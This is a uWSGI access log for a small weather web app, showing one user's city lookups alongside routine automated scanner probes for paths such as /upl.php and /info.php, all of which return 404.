+{address space usage: 156516352 bytes/149MB} {rss usage: 28401664 bytes/27MB} [pid: 839|app: 0|req: 2/7] 46.10.204.54 () {40 vars in 680 bytes} [Thu Apr  4 23:50:00 2024] GET /static/styles/style.css => generated 359 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 7 headers in 278 bytes (0 switches on core 1)
+{address space usage: 155303936 bytes/148MB} {rss usage: 28102656 bytes/26MB} [pid: 837|app: 0|req: 2/8] 46.10.204.54 () {40 vars in 702 bytes} [Thu Apr  4 23:50:00 2024] GET /favicon.ico => generated 207 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+{address space usage: 156504064 bytes/149MB} {rss usage: 29704192 bytes/28MB} [pid: 834|app: 0|req: 3/9] 46.10.204.54 () {42 vars in 811 bytes} [Thu Apr  4 23:50:09 2024] GET /weather?city= => generated 1109 bytes in 135 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+{address space usage: 156504064 bytes/149MB} {rss usage: 29704192 bytes/28MB} [pid: 834|app: 0|req: 4/10] 46.10.204.54 () {44 vars in 804 bytes} [Thu Apr  4 23:50:09 2024] GET /static/styles/style.css => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 1)
+{address space usage: 156352512 bytes/149MB} {rss usage: 28823552 bytes/27MB} [pid: 836|app: 0|req: 3/11] 46.10.204.54 () {42 vars in 836 bytes} [Thu Apr  4 23:50:14 2024] GET /weather?city=Berlin => generated 1113 bytes in 101 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+{address space usage: 156352512 bytes/149MB} {rss usage: 29351936 bytes/27MB} [pid: 836|app: 0|req: 4/12] 46.10.204.54 () {44 vars in 810 bytes} [Thu Apr  4 23:50:14 2024] GET /static/styles/style.css => generated 0 bytes in 38 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 1)
+{address space usage: 156516352 bytes/149MB} {rss usage: 28827648 bytes/27MB} [pid: 839|app: 0|req: 3/13] 46.10.204.54 () {40 vars in 747 bytes} [Thu Apr  4 23:50:45 2024] GET / => generated 574 bytes in 23 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 156520448 bytes/149MB} {rss usage: 28987392 bytes/27MB} [pid: 837|app: 0|req: 3/14] 46.10.204.54 () {40 vars in 688 bytes} [Thu Apr  4 23:50:45 2024] GET /static/styles/style.css => generated 359 bytes in 32 msecs via sendfile() (HTTP/1.1 200) 7 headers in 278 bytes (0 switches on core 0)
+{address space usage: 156516352 bytes/149MB} {rss usage: 29044736 bytes/27MB} [pid: 839|app: 0|req: 4/15] 46.10.204.54 () {40 vars in 710 bytes} [Thu Apr  4 23:50:45 2024] GET /favicon.ico => generated 207 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+{address space usage: 156520448 bytes/149MB} {rss usage: 29655040 bytes/28MB} [pid: 837|app: 0|req: 4/16] 46.10.204.54 () {42 vars in 829 bytes} [Thu Apr  4 23:50:55 2024] GET /weather?city=Omaha => generated 1110 bytes in 136 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 1)
+{address space usage: 156504064 bytes/149MB} {rss usage: 29704192 bytes/28MB} [pid: 834|app: 0|req: 5/17] 46.10.204.54 () {44 vars in 817 bytes} [Thu Apr  4 23:50:56 2024] GET /static/styles/style.css => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 0)
+{address space usage: 156504064 bytes/149MB} {rss usage: 29704192 bytes/28MB} [pid: 834|app: 0|req: 6/18] 46.10.204.54 () {42 vars in 837 bytes} [Thu Apr  4 23:50:57 2024] GET /weather?city= => generated 1109 bytes in 95 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 1)
+{address space usage: 156352512 bytes/149MB} {rss usage: 29351936 bytes/27MB} [pid: 836|app: 0|req: 5/19] 46.10.204.54 () {44 vars in 812 bytes} [Thu Apr  4 23:50:57 2024] GET /static/styles/style.css => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 0)
+{address space usage: 156352512 bytes/149MB} {rss usage: 29351936 bytes/27MB} [pid: 836|app: 0|req: 6/20] 104.248.174.155 () {34 vars in 506 bytes} [Fri Apr  5 00:06:36 2024] GET / => generated 574 bytes in 7 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+{address space usage: 156516352 bytes/149MB} {rss usage: 29044736 bytes/27MB} [pid: 839|app: 0|req: 5/21] 104.248.174.155 () {34 vars in 423 bytes} [Fri Apr  5 00:06:37 2024] GET /form.html => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+{address space usage: 156520448 bytes/149MB} {rss usage: 29655040 bytes/28MB} [pid: 837|app: 0|req: 5/22] 104.248.174.155 () {34 vars in 420 bytes} [Fri Apr  5 00:06:37 2024] GET /upl.php => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+{address space usage: 156516352 bytes/149MB} {rss usage: 29044736 bytes/27MB} [pid: 839|app: 0|req: 6/23] 104.248.174.155 () {34 vars in 518 bytes} [Fri Apr  5 00:06:37 2024] GET /geoip/ => generated 207 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+{address space usage: 156520448 bytes/149MB} {rss usage: 29655040 bytes/28MB} [pid: 837|app: 0|req: 6/24] 104.248.174.155 () {34 vars in 528 bytes} [Fri Apr  5 00:06:37 2024] GET /favicon.ico => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+{address space usage: 156504064 bytes/149MB} {rss usage: 29704192 bytes/28MB} [pid: 834|app: 0|req: 7/25] 104.248.174.155 () {34 vars in 516 bytes} [Fri Apr  5 00:06:37 2024] GET /1.php => generated 207 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+{address space usage: 156504064 bytes/149MB} {rss usage: 29704192 bytes/28MB} [pid: 834|app: 0|req: 8/26] 104.248.174.155 () {34 vars in 524 bytes} [Fri Apr  5 00:06:37 2024] GET /bundle.js => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+{address space usage: 156352512 bytes/149MB} {rss usage: 29351936 bytes/27MB} [pid: 836|app: 0|req: 7/27] 104.248.174.155 () {34 vars in 518 bytes} [Fri Apr  5 00:06:37 2024] GET /files/ => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+{address space usage: 156352512 bytes/149MB} {rss usage: 29351936 bytes/27MB} [pid: 836|app: 0|req: 8/28] 104.248.174.155 () {34 vars in 548 bytes} [Fri Apr  5 00:06:37 2024] GET /systembc/password.php => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 1)
+{address space usage: 156516352 bytes/149MB} {rss usage: 29065216 bytes/27MB} [pid: 839|app: 0|req: 7/29] 104.248.174.155 () {34 vars in 530 bytes} [Fri Apr  5 00:06:37 2024] GET /password.php => generated 207 bytes in 10 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+{address space usage: 156520448 bytes/149MB} {rss usage: 29655040 bytes/28MB} [pid: 837|app: 0|req: 7/30] 104.248.174.155 () {34 vars in 522 bytes} [Fri Apr  5 00:06:37 2024] GET /info.php => generated 207 bytes in 1 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
+{address space usage: 156516352 bytes/149MB} {rss usage: 29065216 bytes/27MB} [pid: 839|app: 0|req: 8/31] 91.92.240.101 () {36 vars in 453 bytes} [Fri Apr  5 00:14:11 2024] GET / => generated 574 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+{address space usage: 156520448 bytes/149MB} {rss usage: 29655040 bytes/28MB} [pid: 837|app: 0|req: 8/32] 121.229.185.160 () {46 vars in 866 bytes} [Fri Apr  5 00:16:37 2024] GET / => generated 574 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+{address space usage: 156504064 bytes/149MB} {rss usage: 29704192 bytes/28MB} [pid: 834|app: 0|req: 9/33] 185.224.128.43 () {44 vars in 802 bytes} [Fri Apr  5 00:29:19 2024] GET / => generated 574 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
+{address space usage: 156504064 bytes/149MB} {rss usage: 29704192 bytes/28MB} [pid: 834|app: 0|req: 10/34] 146.19.24.28 () {28 vars in 330 bytes} [Fri Apr  5 00:47:27 2024] GET / => generated 574 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+{address space usage: 156352512 bytes/149MB} {rss usage: 29351936 bytes/27MB} [pid: 836|app: 0|req: 9/35] 46.10.204.54 () {42 vars in 842 bytes} [Fri Apr  5 02:01:18 2024] GET /weather?city=Omaha => generated 1110 bytes in 111 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+{address space usage: 156352512 bytes/149MB} {rss usage: 29351936 bytes/27MB} [pid: 836|app: 0|req: 10/36] 46.10.204.54 () {44 vars in 817 bytes} [Fri Apr  5 02:01:18 2024] GET /static/styles/style.css => generated 0 bytes in 3 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 1)
+{address space usage: 156516352 bytes/149MB} {rss usage: 29065216 bytes/27MB} [pid: 839|app: 0|req: 9/37] 34.217.253.81 () {34 vars in 573 bytes} [Fri Apr  5 02:03:48 2024] HEAD / => generated 0 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 80 bytes (0 switches on core 0)
+{address space usage: 156520448 bytes/149MB} {rss usage: 29655040 bytes/28MB} [pid: 837|app: 0|req: 9/38] 46.10.204.54 () {42 vars in 847 bytes} [Fri Apr  5 02:12:45 2024] GET /weather?city=Sofia => generated 1107 bytes in 407 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
+{address space usage: 156516352 bytes/149MB} {rss usage: 29065216 bytes/27MB} [pid: 839|app: 0|req: 10/39] 46.10.204.54 () {44 vars in 817 bytes} [Fri Apr  5 02:12:45 2024] GET /static/styles/style.css => generated 0 bytes in 2 msecs (HTTP/1.1 304) 4 headers in 182 bytes (0 switches on core 1)
+{address space usage: 156520448 bytes/149MB} {rss usage: 29655040 bytes/28MB} [pid: 837|app: 0|req: 10/40] 146.19.24.28 () {28 vars in 330 bytes} [Fri Apr  5 02:13:57 2024] GET / => generated 574 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 1)
+{address space usage: 156504064 bytes/149MB} {rss usage: 29704192 bytes/28MB} [pid: 834|app: 0|req: 11/41] 198.235.24.149 () {30 vars in 610 bytes} [Fri Apr  5 02:27:02 2024] GET / => generated 574 bytes in 1 msecs (HTTP/1.0 200) 2 headers in 80 bytes (1 switches on core 0)
